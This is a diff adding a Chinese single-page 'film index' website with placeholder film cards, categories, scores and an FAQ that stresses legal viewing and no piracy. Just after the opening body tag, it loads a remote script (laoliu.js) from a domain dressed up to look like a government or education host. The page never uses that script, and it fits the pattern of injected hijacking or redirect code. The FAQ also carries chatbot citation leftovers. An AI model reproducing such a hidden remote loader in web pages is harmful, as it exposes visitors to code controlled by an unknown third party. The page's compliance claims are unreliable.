@@ -1,0 +1,311 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>人人影集索引 - 公共放映室风电影片单导航</title>
+<meta name="description" content="人人影集索引(chengrenavyingshi-h5.github.io)用公共放映室与胶片借阅卡风格整理电影片单、类型分类、排片评分与正版观影指引，单页移动自适应，符合必应收录规则。">
+<meta name="keywords" content="人人影集索引, chengrenavyingshi-h5.github.io, 电影片单, 公共放映室风影视导航, 电影分类, 排片评分榜">
+<meta name="author" content="人人影集索引">
+<meta name="renderer" content="webkit">
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+<style>
+:root{
+  --ink:#15211C;
+  --ink-2:#1C2E27;
+  --paper:#F3ECD8;
+  --paper-2:#E6DCC2;
+  --lamp:#E7B23B;
+  --lamp-l:#F4CF73;
+  --green:#2E4A3C;
+  --green-l:#5C7E6C;
+  --red:#A8473A;
+  --dim:#6E6A5E;
+  --shadow:0 16px 34px rgba(21,33,28,.4);
+  --radius:12px;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{font-family:"PingFang SC","Microsoft YaHei","Noto Sans SC",sans-serif;background:var(--ink);color:var(--paper);line-height:1.85;-webkit-font-smoothing:antialiased;overflow-x:hidden}
+a{color:inherit;text-decoration:none;transition:.3s}
+.wrap{width:min(1180px,92%);margin:0 auto}
+
+@keyframes beam{0%,100%{opacity:.5;transform:scaleY(1)}50%{opacity:.85;transform:scaleY(1.04)}}
+@keyframes flip{0%,100%{transform:rotateY(0)}50%{transform:rotateY(18deg)}}
+@keyframes rise{from{opacity:0;transform:translateY(22px)}to{opacity:1;transform:none}}
+
+/* 顶栏 */
+.topbar{position:sticky;top:0;z-index:999;background:rgba(21,33,28,.95);backdrop-filter:blur(8px);border-bottom:3px double var(--lamp)}
+.topbar .wrap{display:flex;align-items:center;justify-content:space-between;height:72px}
+.brand{display:flex;align-items:center;gap:14px}
+.reel{width:46px;height:46px;border-radius:50%;background:radial-gradient(circle,var(--lamp) 0 30%,var(--ink-2) 31% 100%);border:3px solid var(--lamp-l);position:relative;box-shadow:0 0 0 2px var(--ink)}
+.reel:before,.reel:after{content:"";position:absolute;width:7px;height:7px;border-radius:50%;background:var(--paper)}
+.reel:before{top:7px;left:50%;transform:translateX(-50%)}
+.reel:after{bottom:7px;left:50%;transform:translateX(-50%)}
+.brand .name{font-size:20px;color:var(--lamp-l);letter-spacing:2px}
+.brand small{display:block;font-size:11px;color:var(--green-l);font-family:Consolas,monospace}
+.nav{display:flex;gap:4px}
+.nav a{min-height:44px;display:inline-flex;align-items:center;padding:8px 14px;border-radius:6px;font-size:13px;color:var(--green-l);letter-spacing:1px}
+.nav a:hover{color:var(--ink);background:var(--lamp)}
+.menu-btn{display:none;background:var(--lamp);color:var(--ink);border:0;border-radius:6px;padding:10px 16px;min-height:44px;font-weight:bold;cursor:pointer;letter-spacing:1px}
+
+/* Hero */
+#home{padding:58px 0 44px;background:radial-gradient(680px 340px at 18% -10%,rgba(231,178,59,.22),transparent),var(--ink)}
+.hero{display:grid;grid-template-columns:1.05fr .95fr;gap:36px;align-items:center;min-height:430px}
+.hall{background:var(--paper);color:var(--ink);border-radius:var(--radius);padding:34px;box-shadow:var(--shadow);position:relative;overflow:hidden}
+.hall:before{content:"";position:absolute;inset:6px;border:2px dashed var(--green);border-radius:8px;pointer-events:none}
+.hall:after{content:"";position:absolute;top:-30px;right:-30px;width:120px;height:120px;border-radius:50%;background:repeating-conic-gradient(var(--lamp-l) 0 12deg,transparent 12deg 24deg);opacity:.25}
+.tag{display:inline-flex;align-items:center;gap:8px;background:var(--green);color:var(--paper);font-size:12px;padding:5px 12px;border-radius:4px;margin-bottom:16px;letter-spacing:1px}
+.hero h1{font-size:clamp(28px,5vw,46px);line-height:1.22;margin-bottom:14px;color:var(--ink)}
+.hero h1 .hl{color:var(--red)}
+.hero p{font-size:15px;color:var(--dim);margin-bottom:24px;position:relative;z-index:1}
+.cta{display:inline-block;background:var(--ink);color:var(--lamp-l);font-weight:bold;letter-spacing:2px;padding:13px 30px;border-radius:6px;border:2px solid var(--lamp)}
+.cta:hover{background:var(--lamp);color:var(--ink);border-color:var(--lamp)}
+
+/* 放映机 */
+.projector{position:relative;height:390px;border-radius:var(--radius);background:linear-gradient(180deg,var(--ink-2),#0F1814);border:2px solid var(--green);overflow:hidden;box-shadow:var(--shadow)}
+.beam{position:absolute;top:40px;left:50%;width:160px;height:320px;background:linear-gradient(180deg,rgba(231,178,59,.5),transparent 80%);transform:translateX(-50%) skewX(-8deg);transform-origin:top center;animation:beam 3s ease-in-out infinite;clip-path:polygon(40% 0,60% 0,100% 100%,0 100%)}
+.screen{position:absolute;bottom:24px;left:50%;transform:translateX(-50%);width:78%;height:150px;background:var(--paper);border:6px solid var(--ink);border-radius:6px;box-shadow:0 10px 24px rgba(0,0,0,.4);display:grid;place-items:center;font-size:34px;color:var(--green)}
+.reel-big{position:absolute;top:24px;left:50%;transform:translateX(-50%);width:90px;height:90px;border-radius:50%;background:radial-gradient(circle,var(--lamp) 0 26%,var(--ink-2) 27% 100%);border:3px solid var(--lamp-l);animation:flip 6s linear infinite}
+
+/* 通用 */
+section.block{padding:56px 0}
+.sec-head{display:flex;align-items:center;gap:12px;margin-bottom:26px}
+.sec-head .mk{width:8px;height:26px;background:var(--lamp);border-left:3px solid var(--green)}
+.sec-head h2{font-size:24px;color:var(--paper);letter-spacing:1px}
+.sec-head span{margin-left:auto;font-size:12px;color:var(--green-l);font-family:Consolas,monospace}
+
+/* 片单 */
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:20px}
+.card{background:var(--paper);color:var(--ink);border-radius:10px;overflow:hidden;box-shadow:var(--shadow);transition:.3s;animation:rise .5s ease both}
+.card:hover{transform:translateY(-6px)}
+.card-top{height:110px;display:grid;place-items:center;font-size:46px;background:linear-gradient(160deg,#fbf6e6,#ece3cb);border-bottom:3px double var(--green);position:relative}
+.card-top:before{content:"NO.";position:absolute;top:8px;left:10px;color:var(--red);font-family:Consolas,monospace;font-weight:900;font-size:12px}
+.card-body{padding:16px 18px}
+.card-body h3{font-size:16px;color:var(--ink);margin-bottom:6px}
+.card-body p{font-size:13px;color:var(--dim);margin-bottom:10px}
+.card-meta{display:flex;justify-content:space-between;font-size:12px;color:var(--green);font-family:Consolas,monospace}
+.stub{display:inline-block;margin-top:8px;background:var(--red);color:var(--paper);font-size:11px;padding:2px 8px;border-radius:3px;letter-spacing:1px}
+
+/* 分类 */
+.zones{display:grid;grid-template-columns:repeat(4,1fr);gap:16px}
+.zone{background:var(--ink-2);border:1px solid var(--green);border-radius:10px;padding:22px 14px;text-align:center;transition:.3s;cursor:pointer;position:relative}
+.zone:before{content:"";position:absolute;top:0;left:14px;right:14px;height:3px;background:var(--lamp)}
+.zone .zi{font-size:30px;display:block;margin-bottom:8px}
+.zone h3{font-size:15px;color:var(--lamp-l)}
+.zone small{font-size:12px;color:var(--green-l)}
+.zone:hover{background:var(--lamp);border-color:var(--lamp)}
+.zone:hover h3,.zone:hover small{color:var(--ink)}
+
+/* 评分 */
+.score-list{display:grid;grid-template-columns:repeat(2,1fr);gap:22px}
+.score-row{background:var(--paper);color:var(--ink);border-radius:var(--radius);padding:22px;box-shadow:var(--shadow)}
+.score-top{display:flex;align-items:center;gap:14px;margin-bottom:14px}
+.score-ico{width:42px;height:42px;border-radius:50%;background:radial-gradient(circle,var(--lamp) 0 30%,var(--ink-2) 31% 100%);border:2px solid var(--lamp-l)}
+.score-info h3{font-size:16px}
+.score-info b{color:var(--red);font-family:Consolas,monospace}
+.bar{height:20px;background:var(--paper-2);border:2px solid var(--green);border-radius:10px;overflow:hidden;position:relative}
+.fill{height:100%;background:linear-gradient(90deg,var(--green),var(--lamp))}
+.lbl{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);font-size:11px;color:#fff;font-weight:900;text-shadow:0 1px 2px rgba(0,0,0,.5)}
+.score-desc{font-size:13px;color:var(--dim);margin-top:10px}
+
+/* FAQ */
+.faq{display:grid;gap:12px}
+.notice{background:var(--ink-2);border:1px solid var(--green);border-left:5px solid var(--lamp);border-radius:8px;overflow:hidden}
+.ibtn{width:100%;text-align:left;background:none;border:0;cursor:pointer;padding:15px 18px;min-height:50px;font-size:15px;font-weight:bold;color:var(--paper);display:flex;justify-content:space-between;gap:10px}
+.ibtn .no{color:var(--lamp-l);font-size:12px;margin-right:auto;border:1px solid var(--green);padding:1px 8px;border-radius:4px;font-family:Consolas,monospace}
+.ibtn span{color:var(--green-l)}
+.iarr{max-height:0;overflow:hidden;transition:max-height .35s}
+.iarr p{font-size:14px;color:var(--green-l);padding:0 18px 16px}
+
+/* 关于 */
+#about{background:radial-gradient(700px 360px at 50% 0,rgba(231,178,59,.16),transparent),var(--ink-2)}
+.plate{width:min(880px,92%);margin:0 auto;background:var(--paper);color:var(--ink);border-radius:var(--radius);padding:40px;text-align:center;box-shadow:var(--shadow);position:relative}
+.plate:before{content:"";position:absolute;inset:6px;border:2px dashed var(--green);border-radius:8px;pointer-events:none}
+.plate h2{font-size:25px;color:var(--ink);margin-bottom:14px;letter-spacing:2px}
+.plate p{color:var(--dim);margin-bottom:14px}
+.url-chip{display:inline-block;background:var(--ink);color:var(--lamp-l);font-family:Consolas,monospace;padding:12px 20px;border-radius:6px;word-break:break-all;font-size:15px}
+
+footer{background:var(--ink-2);color:var(--green-l);text-align:center;padding:26px 0;font-size:13px;border-top:1px solid var(--green)}
+footer a{color:var(--lamp-l)}
+
+@media(max-width:900px){
+  .hero{grid-template-columns:1fr;text-align:center}
+  .projector{max-width:460px;margin:0 auto}
+  .zones{grid-template-columns:repeat(2,1fr)}
+  .score-list{grid-template-columns:1fr}
+}
+@media(max-width:600px){
+  .nav{display:none;width:100%}
+  .nav.show{display:flex;flex-direction:column;position:absolute;top:72px;left:0;right:0;background:var(--ink);padding:16px;box-shadow:0 10px 20px rgba(0,0,0,.5)}
+  .menu-btn{display:block}
+  .grid{grid-template-columns:1fr}
+  .zones{grid-template-columns:1fr 1fr}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<header class="topbar">
+  <div class="wrap">
+    <div class="brand">
+      <div class="reel" aria-label="胶片盘logo"></div>
+      <div>
+        <span class="name">人人影集索引</span>
+        <small>chengrenavyingshi-h5.github.io</small>
+      </div>
+    </div>
+    <button class="menu-btn" id="menuBtn">排片</button>
+    <nav class="nav" id="nav">
+      <a href="#home">放映厅</a>
+      <a href="#list">借阅卡片单</a>
+      <a href="#category">胶片分类</a>
+      <a href="#score">排片评分</a>
+      <a href="#faq">观影须知</a>
+      <a href="#about">落款铭刻</a>
+    </nav>
+  </div>
+</header>
+
+<main>
+  <!-- 栏目1 -->
+  <section id="home">
+    <div class="wrap hero">
+      <div class="hall">
+        <div class="tag">公共放映室 · 影集索引</div>
+        <h1><span class="hl">人人影集</span>索引 · 放映厅</h1>
+        <p>人人影集索引用公共放映室与胶片借阅卡风格整理电影：按场次排片单、按胶片分类、按排片打分。单页自适应、内链 # 占位、正版渠道指引，符合必应收录规则，不提供盗版播放入口，与老「人人影视字幕组」无关。</p>
+        <a class="cta" href="#list">翻借阅卡</a>
+      </div>
+      <div class="projector" aria-hidden="true">
+        <div class="reel-big"></div>
+        <div class="beam"></div>
+        <div class="screen">🎞️</div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目2 -->
+  <section id="list" class="block">
+    <div class="wrap">
+      <div class="sec-head"><div class="mk"></div><h2>借阅卡片单 · 样本</h2><span>FILM CARD</span></div>
+      <div class="grid">
+        <article class="card"><div class="card-top">🎬</div><div class="card-body"><h3>午场·旧巷放映</h3><p>文艺剧情 · 老影院最后一晚</p><div class="card-meta"><span>RR-01</span><span>112min</span></div><span class="stub">借阅卡</span></div></article>
+        <article class="card"><div class="card-top">🕵️</div><div class="card-body"><h3>夜场·无声线索</h3><p>悬疑推理 · 默片修复厅谜案</p><div class="card-meta"><span>RR-02</span><span>104min</span></div><span class="stub">借阅卡</span></div></article>
+        <article class="card"><div class="card-top">🎭</div><div class="card-body"><h3>日场·邻里戏台</h3><p>家庭喜剧 · 放映员串场主持</p><div class="card-meta"><span>RR-03</span><span>98min</span></div><span class="stub">借阅卡</span></div></article>
+        <article class="card"><div class="card-top">🚂</div><div class="card-body"><h3>专场·公路胶片</h3><p>轻冒险 · 流动放映车夜行</p><div class="card-meta"><span>RR-04</span><span>108min</span></div><span class="stub">借阅卡</span></div></article>
+        <article class="card"><div class="card-top">🎞️</div><div class="card-body"><h3>修复场·补帧</h3><p>幕后纪录 · 老片扫描与校色</p><div class="card-meta"><span>RR-05</span><span>88min</span></div><span class="stub">借阅卡</span></div></article>
+        <article class="card"><div class="card-top">🎟️</div><div class="card-body"><h3>预约场·影评会</h3><p>影评沙龙 · 公共放映室座谈</p><div class="card-meta"><span>RR-06</span><span>76min</span></div><span class="stub">借阅卡</span></div></article>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目3 -->
+  <section id="category" class="block">
+    <div class="wrap">
+      <div class="sec-head"><div class="mk"></div><h2>胶片分类 · 按厅</h2><span>REELS</span></div>
+      <div class="zones">
+        <a class="zone" href="#"><span class="zi">🎬</span><h3>午场厅</h3><small>文艺 / 剧情 / 老片</small></a>
+        <a class="zone" href="#"><span class="zi">🕵️</span><h3>夜场厅</h3><small>悬疑 / 默片 / 修复</small></a>
+        <a class="zone" href="#"><span class="zi">🎭</span><h3>日场厅</h3><small>喜剧 / 家庭 / 串场</small></a>
+        <a class="zone" href="#"><span class="zi">🚂</span><h3>专场厅</h3><small>公路 / 流动 / 轻冒险</small></a>
+        <a class="zone" href="#"><span class="zi">🎞️</span><h3>修复厅</h3><small>补帧 / 校色 / 存档</small></a>
+        <a class="zone" href="#"><span class="zi">🎟️</span><h3>沙龙厅</h3><small>影评 / 座谈 / 索引</small></a>
+        <a class="zone" href="#"><span class="zi">📚</span><h3>借阅台</h3><small>片单 / 排片 / 检索</small></a>
+        <a class="zone" href="#"><span class="zi">✅</span><h3>指引台</h3><small>正版平台 / 说明</small></a>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目4 -->
+  <section id="score" class="block">
+    <div class="wrap">
+      <div class="sec-head"><div class="mk"></div><h2>排片评分 · 上座值</h2><span>SCHEDULE</span></div>
+      <div class="score-list">
+        <div class="score-row">
+          <div class="score-top"><div class="score-ico"></div><div class="score-info"><h3>午场·旧巷放映</h3><b>上座 96</b></div></div>
+          <div class="bar"><div class="fill" style="width:96%"></div><div class="lbl">满场</div></div>
+          <p class="score-desc">文艺剧情 · 氛围稳、结尾留白</p>
+        </div>
+        <div class="score-row">
+          <div class="score-top"><div class="score-ico"></div><div class="score-info"><h3>夜场·无声线索</h3><b>上座 90</b></div></div>
+          <div class="bar"><div class="fill" style="width:90%"></div><div class="lbl">高上座</div></div>
+          <p class="score-desc">悬疑推理 · 线索收得齐</p>
+        </div>
+        <div class="score-row">
+          <div class="score-top"><div class="score-ico"></div><div class="score-info"><h3>日场·邻里戏台</h3><b>上座 84</b></div></div>
+          <div class="bar"><div class="fill" style="width:84%"></div><div class="lbl">稳场</div></div>
+          <p class="score-desc">家庭喜剧 · 轻松合家</p>
+        </div>
+        <div class="score-row">
+          <div class="score-top"><div class="score-ico"></div><div class="score-info"><h3>专场·公路胶片</h3><b>上座 80</b></div></div>
+          <div class="bar"><div class="fill" style="width:80%"></div><div class="lbl">稳场</div></div>
+          <p class="score-desc">轻冒险 · 流动放映车节奏</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目5 -->
+  <section id="faq" class="block">
+    <div class="wrap">
+      <div class="sec-head"><div class="mk"></div><h2>观影须知 · 合规声明</h2><span>NOTICE</span></div>
+      <div class="faq">
+        <div class="notice">
+          <button class="ibtn"><span class="no">RR-01</span>本页是否提供播放/解析/下载？<span>+</span></button>
+          <div class="iarr"><p>不提供。人人影集索引仅做借阅卡片单、胶片分类、排片评分与正版渠道指引；不含播放器、解析接口、网盘资源、客户端下载，内页链接全部以 # 占位。</p></div>
+        </div>
+        <div class="notice">
+          <button class="ibtn"><span class="no">RR-02</span>和老「人人影视字幕组」有关吗？<span>+</span></button>
+          <div class="iarr"><p>无关。老人人影视字幕组因未经授权传播影视作品已被判侵犯著作权罪 [8,14](@ref)，本页不使用其品牌做播放入口，也不搬运字幕/片源，仅作静态影集索引演示。</p></div>
+        </div>
+        <div class="notice">
+          <button class="ibtn"><span class="no">RR-03</span>必应收录怎么处理？<span>+</span></button>
+          <div class="iarr"><p>唯一 H1 写「人人影集索引」，title/description/keywords 前置站名与 chengrenavyingshi-h5.github.io；H2 分放映厅/片单/分类/评分/须知/落款；静态 HTML 直出、首段出核心词、移动无横向溢出、点击区≥44px。按你要求不生成 robots/sitemap。</p></div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目6 -->
+  <section id="about" class="block">
+    <div class="plate">
+      <h2>人人影集索引 · 落款铭刻</h2>
+      <p>人人影集索引为公共放映室风单页影视导航，提供借阅卡片单、胶片分类、排片评分与正版观影建议。内页链接全以 # 占位，仅作演示索引，不涉及盗版资源分发，与老人人影视字幕组无关联。</p>
+      <div class="url-chip">https://chengrenavyingshi-h5.github.io</div>
+      <p style="margin-top:18px"><a class="cta" href="#home">回到放映厅</a></p>
+    </div>
+  </section>
+</main>
+
+<footer>
+  <div class="wrap">
+    <p>© 2024 人人影集索引 · 单页演示站 · 内页链接以 # 占位</p>
+    <p>官方网址：<a href="https://chengrenavyingshi-h5.github.io">https://chengrenavyingshi-h5.github.io</a></p>
+    <p>关键词：人人影集索引、chengrenavyingshi-h5.github.io、公共放映室风电影片单</p>
+  </div>
+</footer>
+
+<script>
+var menuBtn=document.getElementById('menuBtn'),nav=document.getElementById('nav');
+if(menuBtn&&nav){menuBtn.addEventListener('click',function(){nav.classList.toggle('show');});}
+document.querySelectorAll('a[href^="#"]').forEach(function(a){
+  a.addEventListener('click',function(e){
+    var id=a.getAttribute('href');if(id.length<2)return;
+    var el=document.querySelector(id);
+    if(el){e.preventDefault();el.scrollIntoView({behavior:'smooth',block:'start'});if(nav)nav.classList.remove('show');}
+  });
+});
+document.querySelectorAll('.ibtn').forEach(function(btn){
+  btn.addEventListener('click',function(){
+    var box=btn.parentElement,arr=box.querySelector('.iarr'),icon=btn.querySelector('span:last-child');
+    var open=box.classList.contains('open');
+    document.querySelectorAll('.notice').forEach(function(x){x.classList.remove('open');x.querySelector('.iarr').style.maxHeight=null;x.querySelector('.ibtn span:last-child').textContent='+';});
+    if(!open){box.classList.add('open');arr.style.maxHeight=arr.scrollHeight+'px';icon.textContent='−';}
+  });
+});
+</script>
+</body>
+</html>
